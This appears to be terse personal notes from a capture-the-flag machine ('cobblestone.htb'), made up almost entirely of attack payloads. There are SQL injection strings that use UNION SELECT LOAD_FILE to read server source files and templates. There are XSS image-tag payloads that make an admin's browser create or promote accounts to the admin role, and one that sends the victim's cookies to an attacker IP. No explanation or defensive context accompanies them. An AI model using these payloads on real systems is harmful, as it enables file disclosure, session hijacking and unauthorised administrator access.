https://blog.csdn.net/m0_65785435/article/details/150431142

fileread  on  /suggest.php	thru sqlinjection 

test' UNION ALL SELECT NULL,NULL,NULL,LOAD_FILE('/var/www/vote/index.php'),NULL-- -

test' UNION ALL SELECT NULL,NULL,NULL,LOAD_FILE('/var/www/html/download.php'),NULL-- -

test' UNION ALL SELECT NULL,NULL,NULL,LOAD_FILE('/var/www/vote/suggest.php'),NULL-- -

test' UNION ALL SELECT NULL,NULL,NULL,LOAD_FILE('/var/www/html/skins.php'),NULL-- -
downloads.html.twig
suggestform.html.twig
upload.html.twig
user.html.twig
suggest.html.twig

test' UNION ALL SELECT NULL,NULL,NULL,LOAD_FILE('/var/www/html/templates/user.html.twig'),NULL-- -

http://10.10.15.53/skin.png



// get the admin to prove ur skin 

// rearrange /secltists/Fuzzing/XSS/* for ur need 


<img src=x onerror="fetch('http://cobblestone.htb/register.php',{method:'POST',body:'username=hacker5454546&first=hacker&last=hacker&email=hacker12345@test.com&password=hacker123456&role=admin'})">

<img src=x onerror="fetch('http://10.10.15.53:8000/?c='+btoa(document.cookie))">


<img src=x onerror="fetch('http://cobblestone.htb/user.php', {method:'POST', body:'name=hacker5454546&first=hacker&last=hacker&email=hacker12345@test.com&role=admin'})">